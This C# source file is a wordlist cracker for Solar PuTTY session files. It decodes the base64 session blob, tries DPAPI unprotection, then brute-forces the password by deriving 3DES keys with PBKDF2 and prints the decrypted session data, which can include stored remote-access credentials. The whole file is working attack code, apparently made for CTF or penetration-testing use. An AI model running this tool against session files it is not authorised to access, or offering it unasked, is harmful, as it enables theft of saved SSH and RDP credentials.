// Cracks Solar Putty Session Files
// See: https://hackmd.io/@tahaafarooq/cracking-solar-putty

using System;
using System.Security.Cryptography;
using System.Text;
using System.IO;
using System.Linq.Expressions;
using System.Runtime.InteropServices;

class SPCrack {
    private string wordlist_filename = "";
    private string session_filename = "";
    private byte[]? session_data_b64 = null;
    private string session_data_b64_str = "";
    private byte[]? session_data = null;
    private byte[]? unprotected_session_data = null;
    private byte[] salt;
    private byte[] rgbIv;
    private byte[] cyphertext;

    public SPCrack(string wordlist, string session_file) {
        this.wordlist_filename = wordlist;
        this.session_filename = session_file;
    }

    public string Crack() {
        string result = "";

        if(!LoadSessionFile()) {
            return result;
        }

        if (!File.Exists(this.wordlist_filename)) {
            Console.WriteLine("Wordlist file not found.");
            return result;
        }

        try {
            using (StreamReader sr = new StreamReader(this.wordlist_filename)) {
                string? password;
                while ((password = sr.ReadLine()) != null) {
                    if(this.Decrypt(password)) {
                        Console.WriteLine("Password founnd: " + password);
                        result = password;
                        break;
                    }
                }
            }
        } catch (Exception e) {
            Console.WriteLine("Error reading wordlist file: " + e.Message);
        }

        if(result.Length < 1) {
            Console.WriteLine("No password found.");
        }

        return result;
    }

    public bool LoadSessionFile() {
        if (!File.Exists(this.session_filename)) {
            Console.WriteLine("Session file not found.");
            return false;
        }

        try {
            this.session_data_b64 = File.ReadAllBytes(this.session_filename);
        } catch (Exception e) {
            Console.WriteLine("Error reading session file: " + e.Message);
            return false;
        }

        try {
            this.session_data_b64_str = Encoding.UTF8.GetString(this.session_data_b64);
        } catch (Exception e) {
            Console.WriteLine("Error decoding session file: " + e.Message);
            return false;
        }

        try {
            this.session_data = Convert.FromBase64String(this.session_data_b64_str);
        } catch (Exception e) {
            Console.WriteLine("Error decoding session data from base64: " + e.Message);
            return false;
        }

        try {
            this.unprotected_session_data = ProtectedData.Unprotect(session_data, null, DataProtectionScope.CurrentUser);
        } catch (PlatformNotSupportedException e) {
            Console.WriteLine("Current platform cannot try to decrypt session data without password: " + e.Message);
            Console.WriteLine("This is expected on Linux and MacOS. Will continue to try to decrypt with password.");
        } catch (Exception e) {
            // Fail gracefully.
        }

        // If we have unprotected session data, print it.
        if (this.unprotected_session_data != null) {
            Console.WriteLine("Session data without password protection: " + Encoding.UTF8.GetString(this.unprotected_session_data));
        }

        try {
            this.salt = this.session_data.Take(24).ToArray<byte>();
            this.rgbIv = this.session_data.Skip(24).Take(24).ToArray<byte>();
            this.cyphertext = this.session_data.Skip(48).Take(session_data.Length - 48).ToArray<byte>();
        } catch (Exception e) {
            Console.WriteLine("Could not parse session data. " + e.Message);
            return false;
        }
        return true;
    }

    private bool Decrypt(string password) {
        using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, this.salt, 1000)) {
            byte[] key = rfc2898DeriveBytes.GetBytes(24);
            using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider()) {
                tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
			    tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
                using (ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor(key, this.rgbIv)) {
                    using (MemoryStream memoryStream = new MemoryStream(this.cyphertext)){
					    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read)) {
                            byte[] plaintext = new byte[this.cyphertext.Length];
						    int count = cryptoStream.Read(plaintext, 0, plaintext.Length);
						    memoryStream.Close();
						    cryptoStream.Close();
						    string plaintext_string = Encoding.UTF8.GetString(plaintext, 0, count);
                            bool found_it = true;
                            for (int i = 0; i < plaintext_string.Length; i++) {
                                if(!char.IsLetterOrDigit(plaintext_string[i]) && !char.IsWhiteSpace(plaintext_string[i]) && !char.IsPunctuation(plaintext_string[i])) {
                                    found_it = false;
                                }
                            }
                            if(found_it) {
                                Console.WriteLine("Decrypted: " + plaintext_string);
                                return true;
                            }
                        }
                    }
                }
            }
        }
        return false;
    }

    public static void Main(String[] args) {
        if (args.Length < 2) {
            Console.WriteLine("Usage: " + System.Reflection.Assembly.GetExecutingAssembly().GetName().Name + " <wordlist> <session_file>");
            System.Environment.Exit(1);
        }
        SPCrack spcrack = new SPCrack(args[0], args[1]);
        spcrack.Crack();
    }
}